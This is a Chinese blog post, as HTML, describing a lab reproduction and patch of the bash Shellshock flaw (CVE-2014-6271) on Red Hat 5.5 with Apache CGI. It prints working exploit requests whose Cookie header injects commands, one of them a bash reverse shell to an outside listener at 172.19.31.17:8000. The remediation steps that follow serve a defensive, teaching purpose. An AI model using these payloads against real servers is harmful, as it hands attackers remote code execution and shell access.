<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>破壳漏洞利用与修复（shellshock CVE 2014 6271） - Vampire blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta itemprop="name" content="破壳漏洞利用与修复（shellshock CVE 2014 6271）">
<meta itemprop="description" content="环境安装 由于工作环境中一台Redhat 5.5 服务器上存在破壳漏洞（CVE-2014-6271）漏洞，相关漏洞资料中只影响到bash 4.3版本，但是升级到bash 4.4版本漏洞还是可以利用成功。于是在本地安装一台Redhat 5.5 并配置Apache httpd cgi，在安装系统过程中选择支持web服务就可以在运行系统之后直接启用httpd服务。
安全好之后发现Redhat 5.5 的httpd 默认支持cgi功能，如果不支持可以自己手动更改/etc/httpd/conf/httpd.conf内容，如下
去掉 AddHandler cgi-script .cgi 前面的注释
部分教程提示还需要将如下内容去掉注释
然后将cgi脚本放入到/var/www/cgi-bin/目录下，保存为test-cgi文件，内容如下
#!/bin/sh  # disable filename globbing set -f echo &#34;Content-type: text/plain; charset=iso-8859-1&#34; echo echo CGI/1.0 test script report: echo echo argc is $#. argv is &#34;$*&#34;. echo echo SERVER_SOFTWARE = $SERVER_SOFTWARE echo SERVER_NAME = $SERVER_NAME echo GATEWAY_INTERFACE = $GATEWAY_INTERFACE echo SERVER_PROTOCOL = $SERVER_PROTOCOL echo SERVER_PORT = $SERVER_PORT echo REQUEST_METHOD = $REQUEST_METHOD echo HTTP_ACCEPT = &#34;$HTTP_ACCEPT“ echo PATH_INFO = &#34;$PATH_INFO&#34; echo PATH_TRANSLATED = &#34;$PATH_TRANSLATED&#34; echo SCRIPT_NAME = &#34;$SCRIPT_NAME&#34; echo QUERY_STRING = &#34;$QUERY_STRING&#34; echo REMOTE_HOST = $REMOTE_HOSTecho REMOTE_ADDR = $REMOTE_ADDRecho REMOTE_USER = $REMOTE_USERecho AUTH_TYPE = $AUTH_TYPEecho CONTENT_TYPE = $CONTENT_TYPEecho CONTENT_LENGTH = $CONTENT_LENGTH千万记住上传的文件不要使用Windows换行符&rdquo;/r/n&rdquo;，会报错的。。。">
<meta itemprop="datePublished" content="2019-11-04T18:38:19&#43;08:00" />
<meta itemprop="dateModified" content="2019-11-04T18:38:19&#43;08:00" />
<meta itemprop="wordCount" content="227">



<meta itemprop="keywords" content="漏洞修复," /><meta property="og:title" content="破壳漏洞利用与修复（shellshock CVE 2014 6271）" />
<meta property="og:description" content="环境安装 由于工作环境中一台Redhat 5.5 服务器上存在破壳漏洞（CVE-2014-6271）漏洞，相关漏洞资料中只影响到bash 4.3版本，但是升级到bash 4.4版本漏洞还是可以利用成功。于是在本地安装一台Redhat 5.5 并配置Apache httpd cgi，在安装系统过程中选择支持web服务就可以在运行系统之后直接启用httpd服务。
安全好之后发现Redhat 5.5 的httpd 默认支持cgi功能，如果不支持可以自己手动更改/etc/httpd/conf/httpd.conf内容，如下
去掉 AddHandler cgi-script .cgi 前面的注释
部分教程提示还需要将如下内容去掉注释
然后将cgi脚本放入到/var/www/cgi-bin/目录下，保存为test-cgi文件，内容如下
#!/bin/sh  # disable filename globbing set -f echo &#34;Content-type: text/plain; charset=iso-8859-1&#34; echo echo CGI/1.0 test script report: echo echo argc is $#. argv is &#34;$*&#34;. echo echo SERVER_SOFTWARE = $SERVER_SOFTWARE echo SERVER_NAME = $SERVER_NAME echo GATEWAY_INTERFACE = $GATEWAY_INTERFACE echo SERVER_PROTOCOL = $SERVER_PROTOCOL echo SERVER_PORT = $SERVER_PORT echo REQUEST_METHOD = $REQUEST_METHOD echo HTTP_ACCEPT = &#34;$HTTP_ACCEPT“ echo PATH_INFO = &#34;$PATH_INFO&#34; echo PATH_TRANSLATED = &#34;$PATH_TRANSLATED&#34; echo SCRIPT_NAME = &#34;$SCRIPT_NAME&#34; echo QUERY_STRING = &#34;$QUERY_STRING&#34; echo REMOTE_HOST = $REMOTE_HOSTecho REMOTE_ADDR = $REMOTE_ADDRecho REMOTE_USER = $REMOTE_USERecho AUTH_TYPE = $AUTH_TYPEecho CONTENT_TYPE = $CONTENT_TYPEecho CONTENT_LENGTH = $CONTENT_LENGTH千万记住上传的文件不要使用Windows换行符&rdquo;/r/n&rdquo;，会报错的。。。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://vampire-lab.github.io/posts/%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E4%BF%AE%E5%A4%8Dshellshock-cve-2014-6271/" />
<meta property="article:published_time" content="2019-11-04T18:38:19+08:00" />
<meta property="article:modified_time" content="2019-11-04T18:38:19+08:00" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="破壳漏洞利用与修复（shellshock CVE 2014 6271）"/>
<meta name="twitter:description" content="环境安装 由于工作环境中一台Redhat 5.5 服务器上存在破壳漏洞（CVE-2014-6271）漏洞，相关漏洞资料中只影响到bash 4.3版本，但是升级到bash 4.4版本漏洞还是可以利用成功。于是在本地安装一台Redhat 5.5 并配置Apache httpd cgi，在安装系统过程中选择支持web服务就可以在运行系统之后直接启用httpd服务。
安全好之后发现Redhat 5.5 的httpd 默认支持cgi功能，如果不支持可以自己手动更改/etc/httpd/conf/httpd.conf内容，如下
去掉 AddHandler cgi-script .cgi 前面的注释
部分教程提示还需要将如下内容去掉注释
然后将cgi脚本放入到/var/www/cgi-bin/目录下，保存为test-cgi文件，内容如下
#!/bin/sh  # disable filename globbing set -f echo &#34;Content-type: text/plain; charset=iso-8859-1&#34; echo echo CGI/1.0 test script report: echo echo argc is $#. argv is &#34;$*&#34;. echo echo SERVER_SOFTWARE = $SERVER_SOFTWARE echo SERVER_NAME = $SERVER_NAME echo GATEWAY_INTERFACE = $GATEWAY_INTERFACE echo SERVER_PROTOCOL = $SERVER_PROTOCOL echo SERVER_PORT = $SERVER_PORT echo REQUEST_METHOD = $REQUEST_METHOD echo HTTP_ACCEPT = &#34;$HTTP_ACCEPT“ echo PATH_INFO = &#34;$PATH_INFO&#34; echo PATH_TRANSLATED = &#34;$PATH_TRANSLATED&#34; echo SCRIPT_NAME = &#34;$SCRIPT_NAME&#34; echo QUERY_STRING = &#34;$QUERY_STRING&#34; echo REMOTE_HOST = $REMOTE_HOSTecho REMOTE_ADDR = $REMOTE_ADDRecho REMOTE_USER = $REMOTE_USERecho AUTH_TYPE = $AUTH_TYPEecho CONTENT_TYPE = $CONTENT_TYPEecho CONTENT_LENGTH = $CONTENT_LENGTH千万记住上传的文件不要使用Windows换行符&rdquo;/r/n&rdquo;，会报错的。。。"/>
<link href='https://fonts.googleapis.com/css?family=Playfair+Display:700' rel='stylesheet' type='text/css'>
	<link rel="stylesheet" type="text/css" media="screen" href="https://vampire-lab.github.io/css/normalize.css" />
	<link rel="stylesheet" type="text/css" media="screen" href="https://vampire-lab.github.io/css/main.css" />

        <link id="dark-scheme" rel="stylesheet" type="text/css" href="https://vampire-lab.github.io/css/dark.css" />

	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
		<script src="https://vampire-lab.github.io/js/main.js"></script>
</head>

<body>
	<div class="container wrapper">
		<div class="header">
	
		<div class="avatar">
			<a href="https://vampire-lab.github.io/">
				<img src="/images/im/t.png" alt="Vampire blog" />
			</a>
		</div>
	
	<h1 class="site-title"><a href="https://vampire-lab.github.io/">Vampire blog</a></h1>
	<div class="site-description"><p>不去想是否能够成功,既然选择了远方,便只顾风雨兼程。</p><nav class="nav social">
			<ul class="flat"><li><a href="https://github.com/vampire-lab" title="Github"><i data-feather="github"></i></a></li><li><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></li></ul>
		</nav><span class="scheme-toggle"><a href="#" id="scheme-toggle"></a></div>

	<nav class="nav">
		<ul class="flat">
			
			<li>
				<a href="/">Home</a>
			</li>
			
			<li>
				<a href="/posts">All posts</a>
			</li>
			
			<li>
				<a href="/about">About</a>
			</li>
			
			<li>
				<a href="/tags">Tags</a>
			</li>
			
		</ul>
	</nav>
</div>


		<div class="post">
			<div class="post-header">
				
					<div class="meta">
						<div class="date">
							<span class="day">04</span>
							<span class="rest">Nov 2019</span>
						</div>
					</div>
				
				<div class="matter">
					<h1 class="title">破壳漏洞利用与修复（shellshock CVE 2014 6271）</h1>
				</div>
			</div>
					
			<div class="markdown">
				<h3 id="环境安装">环境安装</h3>
<p>由于工作环境中一台Redhat 5.5 服务器上存在破壳漏洞（CVE-2014-6271）漏洞，相关漏洞资料中只影响到bash 4.3版本，但是升级到bash 4.4版本漏洞还是可以利用成功。于是在本地安装一台Redhat 5.5 并配置Apache httpd cgi，在安装系统过程中选择支持web服务就可以在运行系统之后直接启用httpd服务。</p>
<p>安全好之后发现Redhat 5.5 的httpd 默认支持cgi功能，如果不支持可以自己手动更改/etc/httpd/conf/httpd.conf内容，如下</p>
<p><img src="/images/2019/shellshock/2092001-b50286b2ecbefa5f.png" alt="CGI配置"></p>
<p>去掉 AddHandler cgi-script .cgi 前面的注释</p>
<p><img src="/images/2019/shellshock/2092001-08c5085fedaa6fc2.png" alt="CGI配置"></p>
<p>部分教程提示还需要将如下内容去掉注释</p>
<p><img src="/images/2019/shellshock/2092001-23424c9135afb33f.png" alt="CGI配置"></p>
<p>然后将cgi脚本放入到/var/www/cgi-bin/目录下，保存为test-cgi文件，内容如下</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#00f">#!/bin/sh
</span><span style="color:#00f"></span>

<span style="color:#008000"># disable filename globbing</span>
set -f


echo <span style="color:#a31515">&#34;Content-type: text/plain; charset=iso-8859-1&#34;</span>
echo


echo CGI/1.0 test script report:
echo


echo argc is $#. argv is <span style="color:#a31515">&#34;</span>$*<span style="color:#a31515">&#34;</span>.
echo


echo SERVER_SOFTWARE = $SERVER_SOFTWARE
echo SERVER_NAME = $SERVER_NAME
echo GATEWAY_INTERFACE = $GATEWAY_INTERFACE
echo SERVER_PROTOCOL = $SERVER_PROTOCOL
echo SERVER_PORT = $SERVER_PORT
echo REQUEST_METHOD = $REQUEST_METHOD
echo HTTP_ACCEPT = <span style="color:#a31515">&#34;</span>$HTTP_ACCEPT<span style="color:#a31515">“
</span><span style="color:#a31515">echo PATH_INFO = &#34;</span>$PATH_INFO<span style="color:#a31515">&#34;
</span><span style="color:#a31515">echo PATH_TRANSLATED = &#34;</span>$PATH_TRANSLATED<span style="color:#a31515">&#34;
</span><span style="color:#a31515">echo SCRIPT_NAME = &#34;</span>$SCRIPT_NAME<span style="color:#a31515">&#34;
</span><span style="color:#a31515">echo QUERY_STRING = &#34;</span>$QUERY_STRING<span style="color:#a31515">&#34;
</span><span style="color:#a31515">echo REMOTE_HOST = </span>$REMOTE_HOST<span style="color:#a31515">
</span><span style="color:#a31515">echo REMOTE_ADDR = </span>$REMOTE_ADDR<span style="color:#a31515">
</span><span style="color:#a31515">echo REMOTE_USER = </span>$REMOTE_USER<span style="color:#a31515">
</span><span style="color:#a31515">echo AUTH_TYPE = </span>$AUTH_TYPE<span style="color:#a31515">
</span><span style="color:#a31515">echo CONTENT_TYPE = </span>$CONTENT_TYPE<span style="color:#a31515">
</span><span style="color:#a31515">echo CONTENT_LENGTH = </span>$CONTENT_LENGTH<span style="color:#a31515">
</span></code></pre></div><p>千万记住上传的文件不要使用Windows换行符&rdquo;/r/n&rdquo;，会报错的。。。</p>
<p>配置完成启动服务，service httpd start</p>
<p><img src="/images/2019/shellshock/2092001-2f5b67be77a65d3f.png" alt="启动http服务"></p>
<p>访问cgi链接地址，部署成功</p>
<p><img src="/images/2019/shellshock/2092001-1218acf34a3ab604.png" alt="启动成功"></p>
<h3 id="漏洞利用">漏洞利用</h3>
<p>使用bash &ndash;version 命令在虚拟机上查看一下bash版本，结果如下</p>
<p><img src="/images/2019/shellshock/2092001-45e5abb7f1f3c77b.png" alt="bash版本"></p>
<p>为存在漏洞版本，使用poc对漏洞进行验证</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">GET /cgi-bin/test-cgi HTTP/1.1
Host: 10.10.10.130
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Cookie: () { :; }; echo ;/bin/bash -c whoami
User-Agent: CrowdStrike ShellShock Scanner/1.0
Content-Length: 2
</code></pre></div><p>测试结果</p>
<p><img src="/images/2019/shellshock/2092001-58f3602792a0bbbe.png" alt="测试结果"></p>
<p>该poc操作不是很方便，我们使用反弹shell进行利用
本地使用ncat进行监听，ncat -lvvp 8000 ,设置监听端口为8000</p>
<p><img src="/images/2019/shellshock/2092001-8083d699d19bf236.png" alt="设置监听"></p>
<p>在poc中执行反弹语句，/bin/bash -i &gt;&amp; /dev/tcp/172.19.31.17/8000 0&gt;&amp;1</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">GET /cgi-bin/test-cgi HTTP/1.1
Host: 10.10.10.130
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Cookie: () { :; }; echo ;/bin/bash -i &gt;&amp; /dev/tcp/172.19.31.17/8000 0&gt;&amp;1
User-Agent: CrowdStrike ShellShock Scanner/1.0
Content-Length: 0
</code></pre></div><p>发送数据包，反弹成功</p>
<p><img src="/images/2019/shellshock/2092001-a29cb8845051fcde.png" alt="反弹成功"></p>
<p>当前用户为apache，权限较低，可以查看当前服务器版本，使用命令lsb_release -a</p>
<p><img src="/images/2019/shellshock/2092001-400a2115ed996b3a.png" alt="查看系统"></p>
<p>系统版本为Redhat 5.5，没有提权成功。。。</p>
<h3 id="更新升级">更新升级</h3>
<p>升级需要对bash的安装包进行编译，直接编译会报错，是因为默认未安装gcc，但是Redhat未授权的系统不能直接使用yum，所以使用本地镜像中的安装包，做本地yum源，将镜像中的Client解压到指定的路径，需要更新/etc/yum.repos.d/rhel-debuginfo.repo，加入如下内容，下面的配置文件file:///opt/Client就是解压的路径（非root权限最好不要放在这里），然后执行yum makecache （可能不需要）</p>
<p><img src="/images/2019/shellshock/2092001-ab66da0b8b8dd14c.png" alt="rpm安装包"></p>
<p>配置信息</p>
<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[rhel-debuginfo-beta]
name=Red Hat Enterprise Linux $releasever -$basearch - Debug
baseurl=file:///opt/Client
enabled=1
gpgcheck=0
</code></pre></div><p>配置好这些内容，就可以直接yum install gcc了</p>
<p><img src="/images/2019/shellshock/2092001-25b14bb9ae809540.png" alt="安装gcc"></p>
<p>进入到bash源代码目录下，顺序执行./configure、make、make install ，进行编译安装
执行bash &ndash;version 查看当前版本</p>
<p><img src="/images/2019/shellshock/2092001-85033990ef4cf775.png" alt="bash更新后版本"></p>
<p>但是更新完成后验证还是存在漏洞，因为bash默认是安装在/usr/local/bin/目录下，需要创建一个链接到/bin/目录下，完成后重启生效
执行命令mv /bin/bash /bin/bash.bak 首先将原来的bash备份， ln -s /usr/local/bin/bash /bin/bash 创建链接，然后重启即可。
使用poc验证漏洞</p>
<p><img src="/images/2019/shellshock/2092001-323ba64da23efa4e.png" alt="整改成功"></p>
<p>http头中的命令未执行，漏洞整改成功。</p>

			</div>

			<div class="tags">
				
					
						<ul class="flat">
							
							<li><a href="/tags/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D">漏洞修复</a></li>
							
						</ul>
					
				
			</div>


		</div>
	</div>
	<div class="footer wrapper">
	<nav class="nav">
		<div>2019  © Copyright notice |  <a href="https://github.com/knadh/hugo-ink">Ink</a> theme on <a href="https://gohugo.io">Hugo</a></div>
	</nav>
</div>


<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-123-45', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>
<script>feather.replace()</script>
</body>
</html>
